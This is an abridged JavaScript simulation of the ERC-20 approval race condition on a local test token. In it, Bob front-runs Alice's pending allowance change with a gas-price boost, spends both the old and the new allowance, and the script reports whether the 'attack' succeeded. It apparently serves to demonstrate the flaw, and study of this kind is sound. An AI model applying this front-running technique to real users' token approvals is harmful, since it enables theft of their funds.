...
class ApprovalAttackSimulation {
  ...
  async setupInitialState() {
    ...
    const transferTx = await this.ctuToken.transfer(alice.address, CONFIG.INITIAL_TRANSFER);
    await transferTx.wait();

    // Alice approves Bob to spend initial amount
    const approveTx = await this.ctuToken.connect(alice).approve(
      this.actors.bob.address, 
      CONFIG.INITIAL_APPROVAL
    );
  ...
  async executeAttack() {
    ...
    console.log("=== Alice is sending a transaction to the mempool to approve more CTU for Bob.\n");
    
    const approveTxIncreased = await this.ctuToken.connect(alice).approve(
      bob.address, 
      CONFIG.INCREASED_APPROVAL
    );
    ...
    console.log("=== Step 2: Bob detects the pending approval and uses the existing allowance to transfer tokens.");
    ...
    const increasedMaxFeePerGas = gasEstimate.maxFeePerGas + CONFIG.FRONTRUN_GAS_BOOST;
    const increasedMaxPriorityFeePerGas = gasEstimate.maxPriorityFeePerGas + CONFIG.FRONTRUN_GAS_BOOST;

    // Bob sends transferFrom with higher gas to frontrun
    const txBob1 = await this.ctuToken.connect(bob).transferFrom(
      alice.address, 
      bob.address, 
      CONFIG.INITIAL_APPROVAL, 
      {
    ...
    console.log("=== Bob transfers an additional amount using the increased allowance.");
    
    const txBob2 = await this.ctuToken.connect(bob).transferFrom(
      alice.address, 
      bob.address, 
      CONFIG.INCREASED_APPROVAL
    );
  ...
  async verifyAttackResults() {
    ...
    const finalAllowance = await this.ctuToken.allowance(alice.address, bob.address);

    // Check if the attack was successful
    const isAttackSuccessful = 
      finalAliceBalance.toString() === this.expectedResults.aliceBalance.toString() &&
      finalBobBalance.toString() === this.expectedResults.bobBalance.toString() &&
      finalAllowance.toString() === this.expectedResults.finalAllowance.toString();

    if (isAttackSuccessful) {
      console.log("===== Attack Successful =====");
      console.log("The attack has successfully exploited the approval race condition.");
      console.log(`Final Alice Balance: ${ethers.formatUnits(finalAliceBalance, CONFIG.TOKEN_DECIMALS)} CTU`);
      console.log(`Final Bob Balance:   ${ethers.formatUnits(finalBobBalance, CONFIG.TOKEN_DECIMALS)} CTU`);
      console.log(`Final Allowance:     ${ethers.formatUnits(finalAllowance, CONFIG.TOKEN_DECIMALS)} CTU\n`);
    } else {
      console.log("===== Attack Failed =====");
      console.log("The attack did not execute as expected. Details below:");

      // Detailed failure reasons
      if (finalAliceBalance.toString() !== this.expectedResults.aliceBalance.toString()) {
        console.log(`- Alice's balance is ${ethers.formatUnits(finalAliceBalance, CONFIG.TOKEN_DECIMALS)} CTU, expected ${ethers.formatUnits(this.expectedResults.aliceBalance, CONFIG.TOKEN_DECIMALS)} CTU.`);
      }
      if (finalBobBalance.toString() !== this.expectedResults.bobBalance.toString()) {
        console.log(`- Bob's balance is ${ethers.formatUnits(finalBobBalance, CONFIG.TOKEN_DECIMALS)} CTU, expected ${ethers.formatUnits(this.expectedResults.bobBalance, CONFIG.TOKEN_DECIMALS)} CTU.`);
      }
      if (finalAllowance.toString() !== this.expectedResults.finalAllowance.toString()) {
        console.log(`- Allowance is ${ethers.formatUnits(finalAllowance, CONFIG.TOKEN_DECIMALS)} CTU, expected ${ethers.formatUnits(this.expectedResults.finalAllowance, CONFIG.TOKEN_DECIMALS)} CTU.`);
      }
  ...
  async printLastBlockInfo() {
    ...
    console.log(`Base Fee Per Gas: ${ethers.formatUnits(lastBlock.baseFeePerGas || 0, "gwei")} GWEI`);
    console.log("==================================\n");

    // Print transactions, their hashes, and order
    console.log("===== Transactions in Last Block =====");
    const transactions = await Promise.all(
      lastBlock.transactions.map(txHash => ethers.provider.getTransaction(txHash))
    );
  ...
  async printAllBlocksInfo() {
    ...
    for (let blockNumber = 0; blockNumber <= latestBlockNumber; blockNumber++) {
      ...
      if (block.transactions.length > 0) {
        ...
        const transactions = await Promise.all(
          block.transactions.map(txHash => ethers.provider.getTransaction(txHash))
        );
        transactions.sort((a, b) => a.nonce - b.nonce);
